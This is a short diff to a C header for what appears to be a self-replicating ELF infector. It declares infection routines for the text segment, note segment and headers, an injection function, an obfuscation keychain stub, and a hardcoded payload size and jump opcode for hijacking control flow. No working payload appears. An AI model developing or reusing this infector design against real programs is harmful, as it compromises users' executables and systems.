@@ -14,6 +14,7 @@
 #include <sys/mman.h>
 #include <unistd.h>
 #include <stdbool.h>
+#include <string.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -26,7 +27,11 @@
 #define LEFT 0
 #define RIGHT 1
 
-#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
+//#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
+#define PAYLOAD_SIZE 36
+
+#define JMP_OFFSET 66
+#define JMP_OPCODE 0xe9
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -79,7 +84,8 @@ void criteria(struct s_host *host, struct s_keychain *keychain);
 void text_infection(struct s_host *host, struct s_keychain *keychain);
 void note_infection(struct s_host *host, struct s_keychain *keychain);
 void header_infection(struct s_host *host, struct s_keychain *keychain);
-void __exit(void);
+void injection(struct s_host *host, struct s_keychain *keychain);
+void __exit(struct s_host *host, struct s_keychain *keychain);
 
 // STUB (OBFUSCATION)
 __attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
